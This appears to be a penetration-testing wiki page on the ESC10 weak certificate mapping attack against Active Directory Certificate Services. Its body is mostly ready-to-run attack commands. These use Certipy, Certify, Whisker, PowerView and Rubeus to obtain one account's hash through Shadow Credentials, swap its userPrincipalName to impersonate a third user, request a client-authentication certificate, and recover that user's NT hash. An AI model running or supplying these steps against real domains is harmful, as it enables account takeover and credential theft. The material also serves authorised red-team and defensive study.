# (ESC10) Weak Certificate Mapping 

To understand this privilege escalation, it is recommended to know how certificate mapping is performed.

This ESC refers to a weak configuration of the registry keys:
#### Case 1
 * `StrongCertificateBindingEnforcement` set to `0`, meaning no strong mapping is performed
 * A template that specifiy client authentication is enabled (any template, like the built-in `User` template)
 * `GenericWrite` right against any account A to compromise any account B

> [!WARNING]
> There is no solution as a low privileged user to read the `StrongCertificateBindingEnforcement` value. It is worth to try the attack hopping the key is misconfigured.

From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used to enumerate for, and conduct, the ESC10 scenario.

In this scenario, user1 has `GenericWrite` against user2 and want to compromise user3.

First, the user2's hash is needed. It can be retrieved via a Shadow Credentials attack, for example.
```bash
certipy shadow auto -username "user1@$DOMAIN" -p "$PASSWORD" -account user2
```

Then, the `userPrincipalName` of user2 is changed to user3.
```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn user3
```

A certificate permitting client authentication can be requested as user2.
```bash
certipy req -username "user2@$DOMAIN" -hash "$NT_HASH" -ca 'ca_name' -template 'User'
```

The user2's UPN is changed back to something else.
```bash
certipy account update -username "user1@$DOMAIN" -p "$PASSWORD" -user user2 -upn "user2@$DOMAIN"
```

Now, authenticating with the obtained certificate will provide the user3's NT hash with UnPac the hash. The domain must be specified since it is not present in the certificate.
```bash
certipy auth -pfx 'user3.pfx' -domain "$DOMAIN"
```

> [!TIP]
> By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS

From Windows systems, the [Certify](https://github.com/GhostPack/Certify) tool can be used.
```powershell
# Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /currentuser
```

Here, user1 has `GenericWrite` against user2 and want to compromise user3.

First, the user2's credentials are needed. It can be retrieved via a Shadow Credentials attack, for example. Here just the `msDs-KeyCredentialLink` modification part with [Whisker](https://github.com/eladshamir/Whisker):
```powershell
Whisker.exe add /target:"user2" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
```

Then, the `userPrincipalName` of user2 is changed to user3 with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
```powershell
Set-DomainObject user2 -Set @{'userPrincipalName'='user3'} -Verbose
```

A certificate permitting client authentication can be requested in a user2 session.
```powershell
Certify.exe request /ca:'domain\ca' /template:"User"
```

The user2's UPN is changed back to something else.
```powershell
Set-DomainObject user2 -Set @{'userPrincipalName'='user2@dmain.local'} -Verbose
```

Now, authenticating with the obtained certificate will provide the user3's NT hash during UnPac the hash. This action can be realised with [Rubeus](https://github.com/GhostPack/Rubeus). The domain must be specified since it is not present in the certificate.
```powershell
Rubeus.exe asktgt /getcredentials /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"domain.local" /dc:"DOMAIN_CONTROLLER" /show
```